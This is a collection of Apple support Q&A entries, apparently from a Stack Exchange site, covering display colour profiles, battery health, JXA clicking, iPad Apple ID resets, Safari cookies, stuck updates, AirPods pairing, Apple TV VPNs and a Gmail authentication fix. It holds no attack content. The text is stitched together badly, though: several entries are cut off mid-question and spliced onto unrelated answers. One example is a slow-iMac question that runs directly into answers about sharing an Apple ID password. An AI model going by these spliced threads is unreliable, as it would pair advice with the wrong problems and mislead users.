persistent.\nA.2) if you want to exacerbate the effect, create a LUT-based profile, for example with DisplayCAL + Argyll. The OS will really flip.\nSteps:\n\n\n*\n\n*open any raw image in Lightroom or camera raw.\n\n*export the image (can be jpg or tif with sRGB or adobeRGB embedded profile).\n\n*open this image in photoshop (set color to general pre-press) and preview / quickview.\n\n*put them side by side and compare dark areas with detail (like hair or any dark pattern)\n\n*without closing the programs, open \"system preferences->monitor->color\" and use a different monitor profile, if possible a custom profile you created for your specific monitor using a probe (see A.1)\n\n*close system preferences\n\n*compare the images again\n\n\nExpected Results:\nImages should be identical\nActual Results:\nEach program displays dark areas differently. blacks are clipped. may also present a color cast.\nIssue tested on latest OS (Mojave 10.14.4 (18E226) freshly installed) and original Adobe software (Lightroom CC 8.2 build 1204643; CR 11.2) on a new 2018 MacBook Pro.\nIt also happened with High Sierra on the same 2018 mbp and with an older mid 2012 non-retina MacBook Pro (Nvidia GPU).\nI hope someone suggests a solution, or that the cause is finally identified and solved, once and for all.\nThank you. Peace.\nGuido\n\nA: What I did (and I don‘t know whether all steps are nessecary) was:\n\n\n*\n\n*delete the display profile I had already created\n\n*reboot the Mac\n\n*in system preferences changed the resolution of my MacBook Pro 2018‘s display to the value where the icons looked a bit bigger (since the 2016 MBP Apple as a standard uses a value for the resolution that is bigger than the displays native amount of pixels)\n\n*log out of the user account\n\n*log back in\n\n*used DisplayCal with their recommended settings for MacOS an created a new ICC profile\n\n*after the process was finished I set the created profile as systems standard\n\n*rebooted the Mac\n\n*changed the display resolution back to standard value\n\n\nSince then I had no more color shifts when opening PS.\n\nA: Our solution at work is to bring our displays as close to perfect as we can and then never change calibrations. We don't expect quicklook or preview to be adequate for color work although I haven't witnessed them being off substantially across any of the versions of macOS we have in production for color work (10.12 and up).\nAs close to perfect means for us:\n\n\n*\n\n*5 or so models of displays only. Eizo and NEC predominate (Apple's displays have surpassed these vendors in many cases, but we're a bit old school for what color work we do that's billable / commercial.)  \n\n\n*\n\n*https://www.necdisplay.com/colorcritical/home/colormanagement  \n\n*https://www.eizoglobal.com/products/coloredge/index.html  \n\n\n*Don't expect color matching for 30 minutes until things have warmed up.\n\n*Calibrate each day (after the warm up period) and have spare hardware ready when we can only reach calibration target by lowering luminosity. You'll know how much each display drifts and can back of as you feel meets your needs. New hardware and stable environments - once a week might be sufficient for the 3 to 18 month sweet spot for new gear that's not yet starting to age.\n\n*control ambient lighting - the rooms where we need color are dim and matte.  \n\n\n*\n\n*This is the key item to control in my experience - proper lighting makes up for all sorts of sins / omissions / lack of perfection with your gear if your eyes are ready for peak performance. Also key is operator experience. Knowing when you're on and when you're off makes up for all this gear. Some operators can nail color on an iPad Pro and a dark coat / blanket anywhere in the world. They will know when they have it and when they don't and need all of the above to be sure.\n\n\n*have calibrated color booths and representative sample chips readily close to validate what we're seeing digitally lines up with the calibrators and software \n\n*pay to calibrate and test your instruments you use to measure color so your kit can get closer than the margin of error you expect\n\n\n*\n\n*https://www.xrite.com\nNow - not everyone needs to nail color and the above isn't what I did when I worked in the medical imaging business, but since you did so much work on your bug report and research, I wanted to outline publicly one option for solving this once and for all without needing Apple to do anything. Controlling the things you can control lets us do color work, and you might be able to change your setup to achieve your goals as well without needing to do all of the above.\n", "Q: Why is my new battery behaving weirdly? Macbook Pro Early 2011\nI am unable to understand why the battery is varying so much? It was just recently installed and is giving an excellent battery timing but this health difference is weird.\nAny suggestions?\n\n\n\nA: Nothing at all looks odd or out of place. Each of those measurements shows the battery is very good and reporting new cycles. \nThe circuitry that measures this is desiged to capture long time periods so I wouldn’t check back until the battery has 25, 50 and 100 charge cycles. The estimates are derived as time series of voltage measurements that are integrated, so external temperature, CPU / GPU have a large impact in adding noise to the measurements.\nAveraging all of the measurements made so soon seems prudent. Unless and until you’re at 80% FCC - these won’t really tell any compelling story in my experience.\nIf you have a dramatic failure outside the normal aging process, that also is so clear and logged to different diagnostic logs - trying to read these tea leaves of 1% either way isn’t going to tell you anything about the condition of your device.\n", "Q: JXA JavaScript for automation How to make JXA click something What is the JXA equivalent of\n--AppleScript\n    tell application (\"System Events\")\n        click at(x,y)\n    end tell\n\n\nA: Application(\"System Events\")\n  .applicationProcesses.whose({frontmost: true}).at(0)\n  .click({ at: [x, y] })\n\nclick is performed on a UIElement, so we get one, then call click with that.\n\nA: In JXA, it appears that the click() function must be sent to a specific UI element (which can be an application process), while this isn't the case in AppleScript.\n(()=>{\n    return clickAt('Safari', [60, 44]);\n})();\n\n\n// {x, y} relative to screen's top-left\nfunction clickAt(appName, [x, y]) {\n    const sys = Application('System Events');\n    const proc = sys.processes[appName];\n    if (!proc.exists()) return -1;\n\n    return proc.click({ at: [x, y] });\n}\n\nAs you are probably aware, this System Events command is a simulated click, that merely detects a UI element at the specified coordinates belonging to the specified process (regardless of window obscuration, i.e. applications at the rear, out-of-sight, will respond to the command), and if that element recognises a click action (typically if its actions contain one named AXPress), then the action is triggered.  Thus, it is not an actual mouse click event processed by the system.\nBut, given that you're working in JXA, you can optionally benefit from its extended Objective-C bridging:\n(()=>{\n    mouseclick();       // Clicks at mouse location\n    mouseclick(35, 60); // Clicks at coordinates {35, 60}\n                        // relative to top-left of screen\n})();\n\n\nfunction mouseclick(x = null, y = null) {\n    ObjC.import('Cocoa');\n    const nil = $();\n\n    const mouseLoc = $.NSEvent.mouseLocation;\n    const screenH = $.NSScreen.mainScreen.frame.size.height;\n    mouseLoc.y = screenH - mouseLoc.y;\n    var coords = mouseLoc;\n\n    if (x && y) coords = {x: x, y: y};\n\n    var mousedownevent = $.CGEventCreateMouseEvent(nil, \n                                $.kCGEventLeftMouseDown,\n                                coords,\n                                nil);\n\n    var mouseupevent = $.CGEventCreateMouseEvent(nil, \n                            $.kCGEventLeftMouseUp,\n                            coords,\n                            nil);\n\n    $.CGEventPost($.kCGHIDEventTap, mousedownevent);\n    $.CGEventPost($.kCGHIDEventTap, mouseupevent);\n    $.CFRelease(mousedownevent);\n    $.CFRelease(mouseupevent);\n}\n\nThis mouseclick() function sends an actual event to be processed as if it had been generated by physically clicking the mouse.  Thus, as you'd expect, a mouse click won't penetrate through to obscured rear application windows; it acts upon what you see upon a 2D pixel landscape.\n", "Q: macOS 10.14.3 runs incredibly slow on my iMac I updated to macOS Mojave 10.14.3 on a 27\" iMac with 16 GB memory, and it is running super slow.

Do I have to give her my Apple ID password to reset it? She asked me to give her my Apple ID password to log out. But I don't want to share my password. She said she need that password to log out the iPad.\nDo I have to give her my password?  What else can she do?\n\nA: TLDR: Here's why this matters. \nSharing the password is out of the question.   But first let's fully discuss the problem scope.  \nAn iPad needs an Apple Account.  I gather you figured out you can't go far with an iPad without one.  Doing so also activates features like \"Find My iPad\" and iCloud storage and backup, which is free, so why not?   App and media purchases are bound to the account not the device, so you can take your apps/media with you when you change devices.  \nEach human needs their own Apple Account.   So when she buy media or \"buys\" free apps, they're on her account.  I gather she hasn't done much of that because there are password challenges for pay items, but still. \nBut don't accidentally create two Apple accounts.  Everyone I know has two, because of confusion when setting up a new device. Apple won't allow merging of accounts, and you don't want some purchases on one account and some on another.  So she should try in advance to log into icloud.com with a web browser, with past emails.  If she definitely doesn't have an Apple account, she should set one up in advance. \nBack up her data\nCreating her own Apple account and having her iPad on that is a good thing. But she should be clear all her apps will disappear (she can just re-\"buy\" them), and created content may disappear. \nAlso, look in Settings/Mail, Contacts, Calendars to see where notes, contacts, and some data actually lives; if it says 'iCloud' she'll lose it, but she can set up a Gmail account and the Apple Store can help her move it there.  That will need to be done before she disconnects from your Apple ID. \n\nUh-oh.\nDo the switch\nThen you need to get together with her and sign it out of your account and bind it to her [new?] account.  It may seem weird that you need to \"sign in to sign out\", but that's an anti-theft feature.  Part of resetting is unhooking \"Find My iPad\" from your account, something a thief would be very keen on doing obviously.  So Apple requires you to prove you're you, hence the need for your password.  This recently saved a friend's iPad (it was found with the Activation Lock on). \nDoing this \"at the Apple Store\" gives you a better shot of getting help if you get stuck. \n\nA: NO!\nYou absolutely do not have to give her your Apple ID password to reset it. Normally, if you reset it from the device, yes, you do have to enter the Apple ID password to the Apple ID associated with the device, but you do not have to reset it from the device. If you have a computer running macOS (a MacBook, iMac, etc.) or a computer running Windows with iTunes installed, then the following method will not require you to enter your Apple ID password and will still completely destroy all data on the iPad. First, turn the iPad off (hold the lock button until a slider comes up on the screen; slide the slider). Then, once the device has shut down, hold the lock button and the home button simultaneously and continue holding not until the Apple logo appears, but until the recovery mode screen appears (it usually consists of a Lightning cable and an iTunes logo). Then, if you are using a Windows computer, install iTunes on it at this link. Macs have it preinstalled. Plug in the iPad and near the top left corner, you'll see a button that looks like an iPad. If you don't see it at first, just give it a minute. It usually doesn't show up instantly. Once you find the button, click it. Then, in the menu that comes up, click \"Restore iPad...\" and follow the steps that appear on screen.\nHope this helped!\n\nA: Don’t just give the password - that gives full access to your account - she could change the password on you... Make it that you enter the password and reset... Either meet or she sends you the iPad...\n\nA: This is kinda speculative, but can you kick her ipad off your account through your apple ID?\nI know when I go into my phone, there's an entry for my computer there (apple account, my devices) and an option to remove the computer from my account.  It doesn't require proximity or other access to the computer. And Nimeesh Neema mentions going into your account to check if her ipad's been removed [after getting it off].  \nSo you might be able to log into your account, check your devices, and find an option to remove this device from your account.  I don't know what exactly it'll do to the ipad or what needs to be done to get in functional again, but if it somehow doesn't reset neatly she can take it to an apple store and figure it out. I suppose it's then her business to set up her own apple ID to get it working again.\n\nA: As discussed elsewhere in the answers, it is generally not advisable to simply share your Apple ID password with others.\nAlso, having Two-factor authentication enabled provides an extra layer of protection (by notifying you with location and device type of where the login is attempted), and makes any unintended login attempts moot.\nAlternative to Sharing Apple ID Password\nGenerally friends/family exchange Apple ID password to get access to purchased apps, music and movies. A much better alternative than sharing password is to use Family Sharing feature which allows purchased content to be shared.\nFor more information refer to the linked Family Sharing homepage and the Apple Support article:\n\n\n*\n\n*Family Sharing - Apple\n\n*Family Sharing - Apple Support\nFamily Sharing is recommended, because unlike sharing password, it doesn't give unfettered access to your Apple account while letting you share what you may need to share.\n\nComing to the original question, yes it's required to enter Apple ID password and sign out before resetting an iOS device. This is done to discourage any unintended reset attempts. Additionally, Find My iPhone needs to be disabled too (if enabled) when resetting an iOS device.\n\n\n*\n\n*Sign out of iCloud on your iPhone, iPad, iPod touch, Apple TV, or Mac\nAs very nicely and cautiously noted by @SolarMike, sharing the password may be potentially dangerous unless you trust the person with it. It is advisable to get the iPad in person, enter the password, sign out and reset it yourself.\nOnce signed out, check if the device is removed from your account by going to iCloud settings on any one of your other iOS/macOS devices or by going to iCloud website.\nAs a precautionary measure, you should also changed the password once your ex-girlfriend's device is removed successfully from your account.\nAlso, as discussed above, consider leveraging Family Sharing feature in future.\n\nImportant Note\nIt's crucial to note on this occasion, that you enable Two-factor authentication (if not done so yet) for your Apple ID. It helps in tracking and identifying unintended login attempts using your Apple ID. Having Two-factor authentication requires someone with access to your password to approach you to get the code, thereby ensuring security of your account.\nAny login attempt is notified to you on your trusted device(s) with information regarding device type and location where the login is attempted. For more details, refer to the Apple Support article:\n\n\n*\n\n*Two-factor authentication for Apple ID\n\nA: The only way to do it is do it yourself. You need to log out, log out of iCloud, and turn off \"Find My iPad\". Then she can create her own AppleID and log in with it. \nI'd recommend to make an appointment at an Apple Store where you both meet, then you will have someone there who (a) goes through the procedure without getting anything wrong (I can't quite guarantee that my instructions are 100% right), and (b) who can make sure that nobody does anything nefarious (like making sure all you do is entering the password, and making sure your AppleId is gone in the end), and who (c) can help her setting up her own AppleId. \n\nA: You absolutely do not give any personal password to anybody as the other fine answers state.\nHowever, note that for the future, you should create unique accounts, and setup a Family group.\nWith the family group, must of the apps / media can be shared with a girlfriend.\nI share it with my wife and my kid. \n", "Q: Safari randomly and periodically loses cookies It's been a while now that I'm facing this issue.

If so, your problem may be due to this known issue. I do not know of a solution other than turning the Develop menu off.\n\nA: I've tried the suggestion by @Monstieur in the comments above and I've installed the Safari Technology Preview and that has restored the cookie persistency for me.\nI would say that if your Safari is this broken, it can in no way hurt to move over to the preview version. If you want to go further, you could also consider installing a current beta.\n\nA: Chrome and FF have a feature \"Continue where you left off\". With this enabled session cookies are not being deleted anymore (see Chrome doesn't delete session cookies).\nCheck if these affected cookies have \"Session\" as expire date: probably in this case Safari is working well, the issue is that some sites are saving session cookies instead of long exp date cookies.\n", "Q: Can’t disable Siri in iOS 12.2 How do I completely disable Siri in iOS 12.2?

Everything seems to work until I do the required restart. That starts out okay, but eventually, it says \"5 minutes remaining\" and just hangs there for hours, at which point I force restart, and the computer works fine (but the update has not been applied).\nI've retried this a few times, but it always gets stuck in this same spot. I have tried installing the update both with the app store and with the DMG download available from the Apple support website. There are no error messages present.\nIs there any way to diagnose and or fix this (short of a clean install)?\n\nA: Booting into Safe Boot and then installing the .dmg image of the update worked for me. If I tried to install it via the App Store my computer would get stuck even before displaying an estimated time remaining. \n\nA: In the special case of Security Update 2019-002 for High Sierra and Sierra we might have to observe a special caveat:\nApple released an \"incomplete update\". What that means remains unknown in the details. But the end-result for this security update should be for Sierra, 16G1918; for High Sierra, 17G6030 in build numbers. Update failures may or may not be result of this \"incompleteness\".\nIn effect it seems advisable to not rely on the AppStore update process, but instead turn to the latest standalone installers available from Apple, for Sierra at https://support.apple.com/kb/DL1995\nIf installing from that DMG does fail as well, then the standard advice troubleshooting guides come into play:\n\nMacworld: How To Fix A Mac Stuck Installing A macOS Update\n\n\n\n*\n\n*Check Apple's servers\n\n*Switch to a wired connection\n\n*Cancel the download (to be able to restart it)\n\n*Download the software from Apple's support website (the DMG just advised)\n\n\nAfter these are ensured:\n\n\n*\n\n*Find out if your Mac has really frozen\n\n*Look at the Log to see if your Mac is still installing OS X\n\nPress Command + L. This brings up additional information and more details about the amount of time still remaining for the install. It may give you a better indication of what files are being installed and the amount of time left.\n\n\n*Wait (Macworld says \"a few hours\", I say after twenty minutes the Mac had a fighting chance I my time is limited\n\n\n\nWhat to do if your Mac freezes during software installation\n  If you're positive that the Mac isn't still working on updating your software then run through the following steps:\n  \n  \n*\n  \n*Shut down, wait a few seconds, then restart your Mac\n  Press and hold the power button to shut down and start your Mac back up.\n  \n*Go to the Mac App Store and open Updates\n  If you were installing an app from the App Store, then open the App Store and click Updates. You should find that the update/installation process carries on from where it left off.\n  \n*Check the Log screen to see if files are being installed\n  When the progress bar appears, press Command + L again to check the Log screen and ensure files are being installed. If the Log screen shows that nothing is happening move on to the next step.\n  \n*Try installing the Combo update\n  As we mentioned earlier, the Mac App Store isn't the only place you can download Mac software from. Apple still hosts software on its website, so you can download it from there.\n  \n  \n  There's good reason to get your software from Apple's website if you're encountering problems: the version of the software available from the Mac App Store will only include the files necessary to update your Mac. If you go to Apple's support website you can find a Combo updater which includes all the files required to update the macOS. This version of the update will replace all the system files and thereby ensure the update is complete.\n\n  \n*Install in Safe Mode\n  Press the power button and hold down the Shift key to start the Mac up in Safe Mode. Open App Store and update your apps while in Safe mode. Reboot.\n  \n*Make some room\n  If the reason the update was failing was that there wasn't enough storage available to perform the installation then you might be able to delete some files in Safe Mode.\n  \n*Reset the NVRAM\n  If Safe Mode doesn't work, restart the Mac and hold down Command, Option, P and R. This will reset the NVRAM. Wait until the computer restarts and wait to see if it starts updating.\n  For more information read How to reset the PRAM/NVRAM here.\n  \n*Use Recovery Mode to reinstall macOS\n  As a final option you could restart the Mac in Recovery Mode (hold down Command + R at startup). There are a number of options to choose from here - you could recover your Mac from your last Time Machine backup, or perform a disk repair - but we recommend choosing the 'Install new OS' option. We have a separate tutorial on how to reinstall MacOS using Recovery Mode.\n  When it reinstalls macOS your Mac will replace all the Apple system files overwriting any problematic ones that may be contributing to this error - hopefully. This update won't include the latest version of the software so after performing the update, check Software Update and apply the latest macOS update.\n  \n*Install the OS from an external drive\n  If you're still having issues with the install you could try installing the OS from an external drive. Read this tutorial to find out how to install macOS on an external hard drive.\n  \n*Run Disk Utility once you've updated\n  When you finally get the software up and running we advise that you run Disk Utility to correct any issues that might have caused the problem in the first place.\n  \n\nSafeMode is really misplaced at only number 5. SafeMode runs an fsck on the root volume, clears out those ever self-corrupting caches and prevents unneeded-for-the-update-installation software like extensions etc from loading.\nSummary\nIf an update fails\n\n\n*\n\n*retry\n\n*retry with DMG updater\n\n*retry with DMG from SafeMode\n\n*retry after applying some voodoo from the Macworld list (NVRAM etc)\n\n*look for more desperate measures (restore from backup; re-install the system etc)\n\n\nA: First upgrading to high sierra from sierra and then installing the security update solved it for me.\n", "Q: Run siri commands in a shortcut, connect to airplay I can ask siri to connect to my apple tv through airplay with the command “play on bedroom”.\n“Bedroom” is the name of my apple tv\nIs there any way of doing this with a shortcut?\n\nA: Today, on iOS 12.2 it’s not possible to select the output of music from the shortcuts app, so you’re not going to be able to automate that via tap or via Siri shortcut.\n\nThe good news is if you already are using AirPlay - the shortcut to play something leaves that alone, so you could automate playing something else to the current sound output destination for music.\nThis function is so awesome, that I bought a HomePod so I could have Siri play music I can hear. That way my AppleTV and iOS devices can output sound there as well as it being the Siri that listens to what I want to hear. \n", "Q: How to download photos from iCloud (iPhone 4) I have an old iPhone 4 that I'm about to ditch. It has a couple of hundred photos on it, and I briefly looked into a way to access them directly from my Xubuntu laptop. (I no longer have Windows or Mac machines.) However, I decided against that route and decided to open an iCloud account, back-up the photos, and download them from iCloud through my browser. No problem, right?\nExcept that there does seem to be a problem. In iCloud.com it states that my iDevice need to be running iOS 8.x (don't remember the exact sub-version), and my phone is running 7.x, so I guess that's why the photos don't show. So I thought I could get them from the iCloud Drive and download them en masse without the benefits of pretty thumbnails, but there's nothing there either, despite the fact that apparently about 800 MB was uploaded from my phone.\nI'm looking for suggestions on how I can get these photos off this ancient iPhone, or out of iCloud if they're in there somewhere. Thanks.\n\nA: 1. I don't know what iOS 7 looks like but you can try sharing the iCloud link with yourself as they are already backed up in the iCloud.\n\n2. Other option can be to save all the photos to iCloud Drive(this is different from the photos thing) (if it is there). \n3. One can save them to notes and then wait for it to sync and then download it.\n4. See if google photos or drive or Microsoft drive etc can store them.\n5.  Firefox send is a good feature and is private too! If the above option makes you think that this is an app, you're wrong, it is a web tool. Go to send.firefox.com \n6. This is a new thing I came across recently. Go to Privacy-apple and download all the data. It might take a few in preparing the folder.\nI did not remove the options that won't work for you for future readers.\nCheers!\n", "Q: Lost one side of AirPods, buy another side to complete the pair I lost my left AirPod. Can I buy a right AirPod (used) and pair it with my left one?\n\nA: TLDR: Yes it's quite possible a used AirPod (only risk is incompatibility) can be paired to your current AirPod by following these directions (quoted below).\n\nApple's If your AirPods are lost article is a good starting point (originally linked by IconDaemon).\nBefore seeking a replacement, make sure you've attempted to find the missing AirPod using Find My iPhone.\nIf you need to replace it, Apple recommends you \"get the serial number and then contact Apple Support for a replacement\" - presumably to make sure their versions are compatible.\nRegarding setup, you can check out Set up your replacement AirPods or charging case:\n\n  \n*\n  \n*Put both AirPods in your charging case.\n  \n*Open the lid and check the status light. It should flash amber.\n  \n*Press and hold the setup button on the back of the case for 5 seconds. The status light should flash white. If it still flashes\n  amber, connect the case to power, close the lid, and wait 10 minutes.\n  \n*On your iPhone, go to the Home screen.\n  \n*Open the case—with your AirPods inside—and hold it next to your iPhone. A setup animation appears on your iPhone.\n  \n*Tap Connect, then tap Done.\n  \n\nIf you're interested in buying a replacement directly from Apple, you can find more information under AirPods Repair (note that this is US specific, you can find the locale specific page here), where they list a replacement of a lost AirPod as costing $69 + tax + $6.95 shipping fee.\n\nI personally would not want to use somebody's used AirPod, but if necessary I would clean out the earwax and wipe it down with a tissue soaked in hand sanitizer.\n\nA: I have had a long journey with an apple replacement airpod not wanting to pair with the other. I got the following response, after calling them, which to my surprise actually worked:\n\n  \n*\n  \n*Make sure the AirPods are unpaired by going to Settings Bluetooth AirPods Tap the (i) Forget this Device on the companion iOS device\n  (this step is important).\n  \n*Connect a lightning cable to the customer’s Charging Case and connect to a power source.\n  \n*Place both AirPods in the case and put them within 4 inches of their iOS device (be sure they are not on/using the phone during this\n  part).\n  \n*Close the lid and wait 35 minutes. It is very important to wait the full 35 minutes with the lid closed. If this process is interrupted at\n  all, it has to start over completely. \n  \n*After the full uninterrupted 35 minutes, open the Charging Case lid.\n  \n*Press and hold the “setup” button on the back of the AirPods charging case until the status light flashes white.

When you create (or Edit) an event, you can click on the Start time, enter it, and then click on the End time, and enter that as well.  You can also make the event  All-Day.  These options are in the same window used to create the event.\nTo start the process, just double-click or right-click on the day of the event.  Your options will immediately be apparent.  You Title/Name the event,, enter the location now, later, or never.  If the window closes before you finish, double-click the event to edit for the times, notes etc.  Right-click will get you the same options.

This is unusual since 2013 Macs are suppose to have Windows 10 installed to EFI boot. Perhaps you originally had a previous version of Windows installed and upgraded to Windows 10. A BIOS booting Windows requires the drive to be MBR or hybrid partitioned, were as, an EFI booting Windows required a GUID partitioned (GPT) drive. The output from sudo fdisk /dev/disk2 can be used to determine the type of partitioning. \n\nMacs can not BIOS boot Windows from USB drives. EFI booting usually works with most newer Mac computers.\n\nYou probably will need to complete the following steps.\n\n\n*\n\n*Determine the type of partitioning. If necessary, remove the hybrid partitioning.\n\n*Create or rebuild the boot files in the EFI partition (disk2s1).\n\n\nOnce you post the output from the fdisk command, I will add instructions on how to complete the steps.\nThe procedure posted in this answer relies on the use of the command gdisk.

So that's useless.\nI'm looking for a simple little widget that will give me current conditions and a 7+ day forecast. Nothing complicated. But it is really useful and it's a bummer not having it. \n\nA: I modified Apple's Dashboard widget to use an entirely different weather API. You can download it from https://forums.macrumors.com/threads/i-fixed-apples-broken-weather-dashboard-widget.2225715/.\nYou'll need to grab API keys from DarkSky and MapQuest and add them to the top of weatherParser.js inside the modified widget. This process is extensively documented in Widget's readme.\n\nAlternately, you can also use the FairWeather widget.  It's not quite as pretty as Apple's widget, but it gets its weather data directly from the NOAA's servers, so I suspect it's less likely to break than something which pulls from a private company.\nSadly, the original download link is broken, so I uploaded it here: https://macintoshgarden.org/apps/fair-weather\n\nA: \nthe weather widget seems not to work on my 10.13.6... lands in a infinite Validating loop...\n", "Q: The Apple TV doesn't support native VPN configuration - is there another way to use VPN? TL;DR: Apple doesn't allow for native VPN configuration on Apple TVs, is there a reliable way to use a VPN service with my Apple TV?\nAs someone who lives abroad, a VPN can be a real life saver when it comes to  catching up on shows from home. However, one thing which continues to annoy me is the lack of an option to configure a VPN on an Apple TV. With iOS and macOS, using a VPN is as simple as downloading an app and pressing one button, but this is not the case with the Apple TV.\nI understand that some VPN providers offer smart DNS solutions, however, the truth is that this is limiting as it fails to provide the same amount of security offered by standard VPNs and completely omits the option to specify a geo-location which would be my primary use for such a service.\nAs a result, I have been trawling the Internet trying to find a solution. I have come across guides which explain how to put a VPN directly onto a router, however, it is impossible to do so with my router firmware and even if it were, it would come with a few downsides including speed. Other guides suggest using something like a Raspberry Pi to act as a repeater but I do not think this is a reasonable solution for me and it would also prevent my Apple TV from being used as the hub for my HomeKit setup. \nIs there a reasonable alternative (software or hardware) for VPN access on AppleTV other than the ones listed above which would solve this issue?\nCurrently, to circumvent the problem I have been using a VPN on my iPad and then using AirPlay to mirror the video, however, this is rather irritating as it is bottle-necked by Wi-Fi speeds and thus can sometimes buffer and result in low quality.\n\nA: There's no way to add a \"real\" native VPN to the AppleTV through software currently. The DNS-based solutions you describe are really not what you would normally expect from a full VPN solution.\nThe best alternative currently is a hardware solution where you add the VPN externally. I.e. instead of connecting the AppleTV directly to your internet connection, you connect it to a VPN box instead. Such a setup does not prevent your AppleTV from being used as a HomeKit hub.\nThe VPN box might be a dedicated box that does nothing but encapsulate network traffic from the device into the VPN (could be a specialized off-the-shelf VPN device, or a generic device with VPN software such as a small Linux computer or similar).

When I'd like to play a movie it asks PIN code. I enter the PIN code displayed on the TV screen, and seemingly it does not accept it because in the following moment a new enter password window comes up in Beamer and a bit later a new PIN code is displayed on the TV.\nSomething went south. I haven't changed my network setup and haven't touched any setup of Apple TV.\nHowever, my Iphone can connect to Apple TV and I can use it as remote. I can connect to Apple TV from my Macbook Pro and share my screen. Beamer is displayed in Apple TV setups as Unknown device.\nI checked, 25 March a new TvOs was released, my device has this version. Is there any chance Apple introduced something \"magic\" in this update cause my issue? If it is true, in general how quickly Beamer guys release some solution for this?\nI did so far the following any result:\n\n\n*\n\n*restart MBP\n\n*restart Apple TV\n\n*delete Beamer with its cache and other crap it produces (ForkLift helps to delete these files as far as I see)\n\n*Beamer beta version (no available beta version right now)\n\n*factory reset of Apple TV\n\n*I read through multiple issues on Apple's site, but no result\n\n\nHoneslty, I run out of possible solutions.\nAny help would be appreciated.\n\nA: Same thing happened to me. Definitely an issue with the new tvOS. Beamer just has to update their app so it's compatible. I've already shot an email to their support team to let them know. Right now the only workaround I've found is to set the Apple TV to require a password (not a 4 digit PIN) - it should say what it is directly below that (like a 6 digit number) and then when Beamer asks for the password - just enter that and it'll accept it.\n\nA: i've been dealing with this for the past few days too, really annoying. i'd reluctantly accept the need to keep apple tv's password requirement on, but beamer refuses to remember that password even when the box is checked in the beamer prompt, so it's bugging me for that same 6-digit password before each and every file i try to play, i can't even relax for the length of a playlist. updated beamer to 3.3.4 today but it didn't do a thing to help with this new password problem. have written beamer support a couple of times too but they've never been responsive so i'm not surprised i haven't heard back. \n\nA: I just had this happen to my new Apple 4K with the updated remote. Every \"session\" it would require a 4 digit pin code, regardless of selecting \"Remember Password\".\nAfter reading this article, I attempted to change the settings of the Apple TV to require password. This is what I did.\n\n*\n\n*Set Airplay to require a password, and set that password to a 4 digit pin.\n\n*Quit & Restart Beamer 3.5 and load a file, it will ask for the password, enter the new 4 digit pin, and click remember password.\n\n*On the Apple TV 4K tvOS 14.6, change Airplay to \"Allow Access: Same Network & Nearby\".\n\n*Quite & Restart Beamer, test load a file, it should load without requiring a password. Tested with multiple files, the queue now works.\n\nNote; this may have been something to do with preferences being reset, or something being triggered and set on the Apple TV, but either way, I am a happy camper again.\n", "Q: Spotlight conversion in UK units If I type '1 pint' into Spotlight, I am told that this is equivalent to 0.47l. This is true for US units, but I am in the UK, where a pint is 0.57l. Many other imperial units, such as the gallon, are different in the UK, so this isn't a problem exclusively with pints.\nI frequently make quick conversions using Spotlight for cooking and brewing, but have only recently realised that the system is set to use US unit measurements.\nAs far as I know, all my regional settings are set to UK, but I must have missed something somewhere. How do I tell Spotlight to use British measurements?\n\nA: 1 pint varies by country and Spotlight clearly does not use language settings to determine the correct value for 1 pint. It is 473 ml in USA and a few other countries.  See Wikipedia.  In Australia it is 570 ml, in the UK 568 ml, in India 330 ml and the list goes on.\nI have submitted a Feedback Report to Apple FB9020879 and will report in comments what response (if any) that I get.\nUS measurements derive from usage in Britain before the War of Independence. The units were defined in 1707.  Britain changed some definitions in 1824 to the current Imperial units whilst the USA kept to the earlier system.  A bit like spelling changes where Britain has changed since 1776 but the USA has remained more consistent with older usage.\nJust to make it harder for Apple, here in Australia, a pint glass of beer is 570 ml, except in South Australia where it is 425 ml.\nI trust you don't consider this history too irrelevant in a technical forum, but @CaptainProg has referred to his interest in brewing.\n", "Q: Partition table error in external ARECA RAID Thanks for trying to help me fix this problem.\nI have been having trouble with my external RAID, the error message that I got was that I have a partition table error.

Those who have contacted Apple support have been told that a fix is in the works, so the bug could be addressed in the near future.\n\nAppears that the issue has been acknowledged and the fix is a work in progress.\nSome other links worth checking which points to possible resolution:\n\n\n*\n\n*The TL;DR on Apple’s macOS Mojave 10.14.4 Gmail/G-Suite Issue: It’s Fixed\n\n*Apple’s macOS Mojave 10.14.4 Update Includes Gmail Bug – We Have a Possible Fix\n\n*Some macOS Mojave 10.14.4 users having problems with Gmail & G Suite authentication in Apple Mail\n\n*Some macOS Mojave 10.14.4 users having problems with Gmail and G Suite authentication in Apple Mail\n\nA: The issue:\nAs an update to what I've commented above, I had exactly this issue with accounts which were originally created as username@googlemail.com instead of username@gmail.com. Since I always migrated my macOS, it is likely now expecting a @googlemail response during verification, but Google is returning the @gmail instead.\nThe solution:\nTo everyone that is still having issues, this solution simply overwrites the response that Google's servers are issuing. I'm reproducing the following how-to  posted by Gannet on the MacRumours Forums:\n\n\n*\n\n*Download, install and run the app Charles. If this is your first time using Charles it should prompt you to authorize automatic proxy configuration. Do this. (Otherwise just make sure the macOS proxy is enabled and working)\n\n*From the \"Help\" menu choose \"SSL Proxying\" > \"Install Charles Root Certificate\".\nOnce the certificate is installed, find it in your keychain (type Charles into the search), open it, expand the Trust section and set to Always Trust. You will be prompted for your password when closing it.\n\n*Back in Charles, select \"SSL Proxying Settings...\" from the \"Proxy\" menu .\n\n*Add a new location with Host: people.googleapis.com .\n\n*From the Tools menu choose \"Rewrite…\", enable Rewrite, and click the \"Add\" button. \n\n*Add a new location with Host: people.googleapis.com.\nAdd a new action with the following details:\n\n\n*\n\n*Type: Body\n\n*Where: Response\n\n*Replace Value: \n{\"names\":[{\"metadata\":{\"primary\":true},\"displayName\":\"User Name}],\"emailAddresses\":[{\"value\":\"user.name@gmail.com\"}]}\nwhere of course you put in your actual User Name and user.name@gmail.com values.\nIn the end, it should look similar to this:\n\n\n\n\n\n\n\n*Once you \"apply\" this, you're all set. Open \"Internet Accounts\" in the system preferences (or open Mail.app), and follow the authorisation procedure.\n\n*Once everything is working, you can either repeat the steps for each of your problematic accounts, or Quit Charles and feel free to delete the rewrite rules as well as the certificate from your Keychain.\n\n\nA: Open \"Internet Accounts\" in \"System Preferences\" and click on every Google account so that it will prompt you to authenticate via Safari.\n\nAfter updating, it prompted me to open Safari to authenticate one of my emails - resulting in that email working. Connection doctor showed all the other emails as offline, so I deduced that I needed to follow the same flow for all of them.\n\nA: When gmail fails to remain connected on my iMac and MacBook Air running Mojave (which seems to happen after a few hours of inactivity on the account), Mail's window shows an error icon at the account listing (on the left), and a notation \"Login Failed\" (on the right):\n\nIf I put the cursor on the \"Login 